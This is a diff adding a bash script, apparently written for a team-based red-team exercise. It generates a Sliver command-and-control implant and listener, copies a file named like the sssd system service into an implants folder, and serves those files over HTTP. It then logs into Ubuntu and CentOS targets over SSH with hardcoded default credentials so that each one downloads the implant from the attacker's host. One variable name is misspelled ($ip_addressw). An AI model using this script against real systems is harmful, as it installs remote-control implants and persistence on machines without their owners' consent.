@@ -1,0 +1,50 @@
+#!/bin/bash
+
+# Prompt for the Team ID
+echo -n "Enter Team ID: "
+read team_id
+
+# Validate input
+if [[ ! "$team_id" =~ ^[0-9]$ ]]; then
+	echo "Invalid Input! Please Enter A Number (0-9)."
+	exit 1
+fi
+
+# Get IP Address
+ip_address=$(ifconfig eth0 | grep 'inet ' | awk '{print $2}')
+
+if [[ -z "$ip_address" ]]; then
+	echo "No IP Address found for eth0"
+else
+	echo "Your IP Address Is: $ip_address"
+fi
+
+mkdir ~/Desktop/Implants
+cp ~/Desktop/Files/sssd.service ~/Desktop/Implants/sssd.service
+
+windows_ip="10.0.10.${team_id}4"
+centos_ip="10.0.10.${team_id}3"
+ubuntu_ip="10.0.10.${team_id}2"
+
+ubuntu_user="sysadmin"
+ubuntu_pass="changeme"
+
+centos_user="sysadmin"
+centos_pass="changeme"
+
+windows_user=""
+windows_pass=""
+
+# Generate Sliver Implant and Listener
+./SliverInteract.exp $ip_addressw
+
+# Serve the Files
+cd ~/Desktop/Implants
+qterminal -e bash -c "python -m http.server 8090; exec bash" &
+
+cd ../
+# SSH -> Curl the Implant (Ubuntu)
+./ConSSH.exp $ip_address $ubuntu_ip $ubuntu_user $ubuntu_pass
+
+# SSH -> Curl the Implant (CentOS)
+./ConSSH.exp $ip_address $centos_ip $centos_user $centos_pass
